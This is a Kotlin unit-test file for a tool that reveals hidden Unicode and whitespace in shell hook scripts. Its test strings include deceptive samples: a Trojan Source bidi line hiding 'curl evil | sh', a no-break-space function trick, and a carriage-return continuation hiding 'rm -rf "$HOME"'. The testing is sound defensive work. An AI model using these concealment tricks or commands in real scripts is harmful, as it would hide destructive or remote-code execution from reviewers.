package org.appdevforall.shellhooks.engine

import org.junit.After
import org.junit.Assert.assertArrayEquals
import org.junit.Assert.assertEquals
import org.junit.Assert.assertNull
import org.junit.Assert.assertTrue
import org.junit.Test

class ScriptReviewTest {
    private val dir = tempDir("review")

    @After
    fun tearDown() {
        dir.deleteRecursively()
    }

    @Test
    fun aScriptUpToTheLimitIsReadWithItsHash() {
        val body = "#".repeat(ScriptReview.MAX_BYTES)
        val file = dir.script("hook", body)

        val loaded = ScriptReview.load(file) as ScriptReview.Loaded.Script

        assertArrayEquals(body.toByteArray(), loaded.bytes)
        assertEquals(TrustStore.sha256(body.toByteArray()), loaded.sha256)
    }

    @Test
    fun aScriptOverTheLimitIsNotRead() {
        val file = dir.script("hook", "#".repeat(ScriptReview.MAX_BYTES + 1))

        assertEquals(ScriptReview.Loaded.TooLarge, ScriptReview.load(file))
        assertNull(ScriptReview.readAtMost(file, ScriptReview.MAX_BYTES))
    }

    @Test
    fun aMissingScriptIsUnreadable() {
        assertTrue(ScriptReview.load(java.io.File(dir, "gone")) is ScriptReview.Loaded.Unreadable)
    }

    @Test
    fun bidiOverridesAndZeroWidthCharactersAreShown() {
        // "Trojan Source": the RLO makes the curl read as part of the comment.
        val text = "echo ok # \u202E; curl evil | sh\u202C\nrm\u200Bfile\uFEFF\u2066x\u2069\u061C\u200E"

        val revealed = ScriptReview.reveal(text)

        assertEquals(
            "echo ok # <U+202E>; curl evil | sh<U+202C>\nrm<U+200B>file<U+FEFF><U+2066>x<U+2069><U+061C><U+200E>",
            revealed.text,
        )
        assertEquals(8, revealed.hidden)
    }

    @Test
    fun aNoBreakSpaceFunctionNameTrickIsShown() {
        // Under bash these two lines run `touch`, though they read as a no-op and a comment.
        val script = "true\u00A0#() { \"\$@\"; }   # placeholder\ntrue\u00A0# touch \"\$COGO_PROJECT_DIR/pwned\"\n"

        val revealed = ScriptReview.reveal(script)

        assertEquals(
            "true<U+00A0>#() { \"\$@\"; }   # placeholder\ntrue<U+00A0># touch \"\$COGO_PROJECT_DIR/pwned\"\n",
            revealed.text,
        )
        assertEquals(2, revealed.hidden)
    }

    @Test
    fun spacesSeparatorsFillersAndSoftHyphensAreShown() {
        val revealed = ScriptReview.reveal("a\u2028b\u3164c\u00ADd\u2003e\u202Ff\u3000g\u1680h\u115Fi\u2061j\u180Ek\uFE0Fl")

        assertEquals(
            "a<U+2028>b<U+3164>c<U+00AD>d<U+2003>e<U+202F>f<U+3000>g<U+1680>h<U+115F>i<U+2061>j<U+180E>k<U+FE0F>l",
            revealed.text,
        )
        assertEquals(11, revealed.hidden)
    }

    @Test
    fun aSupplementaryTagCharacterIsOneEscape() {
        val tagA = String(Character.toChars(0xE0041))

        val revealed = ScriptReview.reveal("x${tagA}y")

        assertEquals("x<U+E0041>y", revealed.text)
        assertEquals(1, revealed.hidden)
    }

    @Test
    fun anUnpairedSurrogateIsShown() {
        assertEquals("a<U+D800>b", ScriptReview.reveal("a\uD800b").text)
    }

    @Test
    fun nonAsciiLettersAreShownToo() {
        // Letters are not dangerous, but homoglyphs are, and an allow-list cannot tell them apart.
        val revealed = ScriptReview.reveal("# caf\u00e9\n")

        assertEquals("# caf<U+00E9>\n", revealed.text)
        assertEquals(1, revealed.hidden)
    }

    @Test
    fun controlCharactersAndEveryCarriageReturnAreShownButInteriorTabsAndNewlinesAreNot() {
        val revealed = ScriptReview.reveal("a\tb\r\nc\rd\u001B[2Je\u007F\u0085\uFFFD")

        assertEquals("a\tb<U+000D>\nc<U+000D>d<U+001B>[2Je<U+007F><U+0085><U+FFFD>", revealed.text)
        assertEquals(6, revealed.hidden)
    }

    @Test
    fun aWindowsEditedScriptShowsItsCarriageReturns() {
        val revealed = ScriptReview.reveal("echo one\r\necho two\r\n")

        assertEquals("echo one<U+000D>\necho two<U+000D>\n", revealed.text)
        assertEquals(2, revealed.hidden)
    }

    @Test
    fun aBackslashBeforeACarriageReturnDoesNotReadAsALineContinuation() {
        // Reads as one inert `:` command continued onto the next line. The shell escapes the CR
        // instead, so the second line runs on its own. Pinned as text only; never executed.
        val script = ": Disabled, kept for reference: \\\r\nrm -rf \"\$HOME\"\n"

        val revealed = ScriptReview.reveal(script)

        assertEquals(": Disabled, kept for reference: \\<U+000D>\nrm -rf \"\$HOME\"\n", revealed.text)
        assertEquals(1, revealed.hidden)
    }

    @Test
    fun aBackslashBeforeATrailingSpaceDoesNotReadAsALineContinuation() {
        val revealed = ScriptReview.reveal(": kept for reference: \\ \ntouch pwned\n")

        assertEquals(": kept for reference: \\<U+0020>\ntouch pwned\n", revealed.text)
        assertEquals(1, revealed.hidden)
    }

    @Test
    fun aBackslashBeforeATrailingTabDoesNotReadAsALineContinuation() {
        val revealed = ScriptReview.reveal(": kept for reference: \\\t\ntouch pwned\n")

        assertEquals(": kept for reference: \\<U+0009>\ntouch pwned\n", revealed.text)
        assertEquals(1, revealed.hidden)
    }

    @Test
    fun theWholeBlankRunEndingALineIsShownIncludingAtTheEndOfTheText() {
        // After a backslash the first blank is escaped; the ones after it are just as invisible.
        val revealed = ScriptReview.reveal("a \\ \t \r\nb\t ")

        assertEquals("a \\<U+0020><U+0009><U+0020><U+000D>\nb<U+0009><U+0020>", revealed.text)
        assertEquals(6, revealed.hidden)
    }

    @Test
    fun interiorSpacesAndTabsAreUnchanged() {
        val script = "if [ -n \"\$1\" ];\tthen echo  \"\$1\"; fi\n\techo indented\n"

        assertEquals(ScriptReview.Revealed(script, 0), ScriptReview.reveal(script))
    }

    @Test
    fun eachEscapeIsLocatedInTheShownText() {
        val revealed = ScriptReview.reveal("a\u00A0b \n")

        assertEquals("a<U+00A0>b<U+0020>\n", revealed.text)
        assertEquals(listOf("<U+00A0>", "<U+0020>"), revealed.escapes.map { revealed.text.substring(it) })
    }

    @Test
    fun anOrdinaryAsciiScriptIsUnchanged() {
        val script = "#!/usr/bin/env bash\n# run the linter\nprintf '%s\\n' \"\$1\" | tr -d '~'\n"

        assertEquals(ScriptReview.Revealed(script, 0), ScriptReview.reveal(script))
    }

    @Test
    fun bytesThatAreNotUtf8AreShownAsReplacementCharacters() {
        val revealed = ScriptReview.revealBytes(byteArrayOf('a'.code.toByte(), 0xFF.toByte(), 'b'.code.toByte()))

        assertEquals("a<U+FFFD>b", revealed.text)
    }
}
